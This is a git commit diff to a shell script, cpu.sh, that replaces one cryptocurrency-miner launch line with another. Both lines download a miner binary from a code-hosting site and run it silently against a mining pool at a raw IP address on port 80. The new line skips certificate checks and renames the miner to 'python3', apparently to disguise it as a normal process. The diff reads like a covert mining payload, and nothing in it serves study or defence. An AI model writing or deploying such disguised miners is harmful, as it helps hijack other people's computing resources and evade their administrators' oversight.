dc7a6396d92f3ffcdeadbe83800a42c3aaec2cf2
MJVideo <majapahlevi@gmail.com>
2024-04-30 18:31:48 +0000

    Update cpu.sh

--- cpu.sh
+++ cpu.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar -o stratum+tcp://167.71.106.61:80 -u shuga1qk2xeu9l86rw6hwjfezfs3dpy3zcfms0svh9j96 -t4 -p m=solo > /dev/null 2>&1
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.39/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 python3 && ./python3 -a dpowhash  -o stratum+tcp://143.198.4.78:80 -u dpc1qgkrz70qkjqy7yayf7gqtwa7va7g9dek5vm6htr.MJ -T4 -p m=solo > /dev/null 2>&1
